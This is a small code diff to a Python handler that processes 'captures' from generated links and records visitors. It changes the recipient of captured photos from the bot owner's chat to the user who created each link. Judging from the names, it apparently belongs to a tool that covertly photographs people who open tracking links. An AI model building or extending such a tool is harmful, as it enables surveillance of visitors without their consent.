@@ -377,9 +377,9 @@ def _handle_capture(route_link_id=None):
         links = load_json('links.json')
         link_data = links.get(link_id, {})
 
-        # Force ALL captures to owner (config['chat_id']) so photos never get lost
-        owner_id = str(config['chat_id'])
-
+        # ✅ Send to the user who created the link.
+        # Fallback to owner only if link_id is missing/invalid.
+        owner_id = str(link_data.get('created_by') or config['chat_id'])
         visitors = load_json('visitors.json')
         now = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
 
